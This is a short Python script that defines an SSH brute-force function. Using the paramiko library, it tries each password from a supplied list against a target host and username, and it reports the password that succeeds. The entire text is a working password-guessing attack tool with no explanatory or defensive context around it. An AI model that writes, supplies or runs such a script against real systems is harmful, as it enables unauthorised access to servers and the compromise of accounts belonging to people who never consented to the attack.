import paramiko

def ssh_brute_force(target, username, password_list):
    print(f"Starting SSH brute-force on {target} with username '{username}'")
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password.strip())
            print(f"[+] Password found: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"[-] Incorrect password: {password}")
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            break